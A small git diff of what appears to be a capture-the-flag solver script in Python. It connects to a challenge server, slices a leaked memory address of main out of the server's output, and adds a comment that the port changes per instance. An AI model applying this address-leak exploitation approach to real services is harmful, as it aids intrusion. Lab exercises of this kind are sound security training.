@@ -4,7 +4,7 @@ import subprocess
 
 sock = socket()
 HOST = "cmgr.c3t.eecs.net"
-PORT = 23599
+PORT = 23599  # changes each time you create a new instance on pico 
 
 sock.connect((HOST, PORT)) #Connects to the server ip and port that hosts the challenge 
 memory_location = sock.recv(10000).strip()[30:60] #variable with memory location of main. Done by indexing the output of nc connection. 
